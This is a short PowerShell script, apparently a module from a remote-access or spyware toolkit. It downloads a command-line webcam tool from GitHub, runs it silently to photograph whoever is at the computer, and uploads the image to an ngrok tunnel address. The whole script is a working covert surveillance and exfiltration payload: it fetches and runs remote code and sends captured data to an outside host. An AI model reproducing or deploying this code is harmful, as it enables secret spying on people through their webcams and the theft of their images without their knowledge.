function webcam($path) {
    $wc = New-Object System.Net.WebClient
    $wc.DownloadFile("https://github.com/tedburke/CommandCam/raw/master/CommandCam.exe", "$env:TEMP/CommandCam.exe")
    Invoke-Expression "$env:TEMP\CommandCam.exe /filename $path"
}

$Uri = "http://2a5f-87-49-45-68.ngrok.io/sf/download/webcam.png"
$wc = New-Object System.Net.WebClient
webcam("$env:TEMP/rs_webcam_temp.png")
$wc.UploadFile($Uri, "$env:TEMP/rs_webcam_temp.png")